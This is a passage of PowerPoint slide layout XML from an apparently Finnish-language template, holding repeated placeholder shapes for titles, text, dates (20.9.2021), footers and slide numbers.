            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Dian numeron paikkamerkki 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9F84E86E-A6AC-4171-9D24-7390C5247972}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{862A5D82-9F6D-43F9-A13E-9AE4785BC678}" type="slidenum">
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2524714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Sisällön paikkamerkki 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>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0B06D3CA-12E8-4BA2-8094-0B4947FD1096}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{F271C0B9-6D35-4B69-87D9-3655372708DB}" type="datetimeFigureOut">
              <a:rPr lang="fi-FI"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>20.9.2021</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Alatunnisteen paikkamerkki 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2ECA5EAC-8643-4150-A419-BBF907124E4A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Dian numeron paikkamerkki 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{26B0A744-74E4-4651-9E85-FBF46919A1E4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{51C361FA-723C-4FE7-B794-F67BA9FE4E0C}" type="slidenum">
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="917597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963084" y="4406901"/>
            <a:ext cx="10363200" cy="1362075"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t"/>
          <a:lstStyle>
            <a:lvl1pPr algn="l">
              <a:defRPr sz="4000" b="1" cap="all"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI"/>
              <a:t>Muokkaa perustyyl. napsautt.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Tekstin paikkamerkki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Muokkaa tekstin perustyylejä napsauttamalla</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Päivämäärän paikkamerkki 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4BEE0B4A-DB58-47D2-ABAE-3EB1EAB0F403}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{2D53055A-2B0A-4C8E-B857-C1958B8F97E6}" type="datetimeFigureOut">
              <a:rPr lang="fi-FI"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>20.9.2021</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Alatunnisteen paikkamerkki 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{601BCC2F-AB7F-422A-8198-B4139748DF27}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Dian numeron paikkamerkki 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1DD37A5D-1E43-48FB-8FA1-607AD7A5CF98}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{E1FD7FBF-80A2-4103-ABD6-9360C51AAD7C}" type="slidenum">
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2218984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Sisällön paikkamerkk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Sisällön paikkamerkk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Päivämäärän paikkamerkki 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{35880EF4-3921-4DB4-B1A1-BBD55C9BF859}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{318999C1-EB45-4D0E-9D06-66B049EAEE2F}" type="datetimeFigureOut">
              <a:rPr lang="fi-FI"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>20.9.2021</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Alatunnisteen paikkamerkki 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0290EF58-A4A3-4B88-B64F-68FC67F2E7DD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Dian numeron paikkamerkki 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B676F4B6-D9E8-4099-9E40-3D68FA1D22DF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{6C96F25C-EE68-484D-BB5C-9E8ECCD30DA8}" type="slidenum">
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3025612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fi-FI"/>
              <a:t>Muokkaa perustyyl. napsautt.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Tekstin paikkamerkki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 napsauttamalla</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Sisällön paikkamerkk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kstin paikkamerkki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 napsauttamalla</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Sisällön paikkamerkk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7" name="Päivämäärän paikkamerkki 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{12FDD40C-199E-4865-9526-A037C2C0BD78}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{3AD0CC8E-DDF1-4F74-AE85-B61982667461}" type="datetimeFigureOut">
              <a:rPr lang="fi-FI"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>20.9.2021</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Alatunnisteen paikkamerkki 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{14990E3D-471D-4B15-8F3D-7B74A0FC9449}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Dian numeron paikkamerkki 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{17847B05-1BFE-41BE-90E6-2BCA7FB43D2C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{430AD5CE-8E07-409E-8195-5B3041FA807F}" type="slidenum">
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="245199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Päivämäärän paikkamerkki 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{87D9F733-BF9A-4556-B381-55E6D9972935}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{DBBF8BB3-CB79-45E6-98CB-FB6C76E7620D}" type="datetimeFigureOut">
              <a:rPr lang="fi-FI"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>20.9.2021</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Alatunnisteen paikkamerkki 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2B2FDEAC-84D2-4046-A1CF-CBFE701296C7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Dian numeron paikkamerkki 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{39AEB549-2481-4724-8DB0-4B0A8F5EE8BA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{B0C65A26-1199-4534-8A40-E213B26E04AF}" type="slidenum">
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1011149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3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FD2F88A0-2C8C-48DD-967F-B6EA0F2942AD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{BBF112E7-6CFC-45C7-9A3C-57F6BB1F34EE}" type="datetimeFigureOut">
              <a:rPr lang="fi-FI"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>20.9.2021</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Alatunnisteen paikkamerkki 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E07394D5-5660-4BE2-A08C-1D80E14FD611}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Dian numeron paikkamerkki 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B8809153-98D8-4E27-95DB-C1DFF4E33D0F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{05CB51A0-CD1E-4ED1-9537-A9B39AB9B37B}" type="slidenum">
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2913824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609601" y="273050"/>
            <a:ext cx="4011084" cy="1162050"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle>
            <a:lvl1pPr algn="l">
              <a:defRPr sz="2000" b="1"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI"/>
              <a:t>Muokkaa perustyyl. napsautt.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkk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Tekstin paikkamerkki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Muokkaa tekstin perustyylejä napsauttamalla</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Päivämäärän paikkamerkki 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{65FADEB6-08DD-4C46-8537-F23CC2C2C858}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{1F4994E3-6574-4CF5-B8E1-5698DEC96C98}" type="datetimeFigureOut">
              <a:rPr lang="fi-FI"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>20.9.2021</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Alatunnisteen paikkamerkki 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D5E33506-547B-420F-8B43-2DCE665BFB2E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Dian numeron paikkamerkki 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FFC883D8-5F83-474C-B5ED-7C609EBF3FBA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{155C5B8B-41E4-4A8F-8125-386879659933}" type="slidenum">
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3486171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2389717" y="4800600"/>
            <a:ext cx="7315200" cy="566738"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle>
            <a:lvl1pPr algn="l">
              <a:defRPr sz="2000" b="1"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="fi-FI"/>
              <a:t>Muokkaa perustyyl. napsautt.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Kuvan paikkamerkki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kstin paikkamerkki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Muokkaa tekstin perustyylejä napsauttamalla</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Päivämäärän paikkamerkki 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
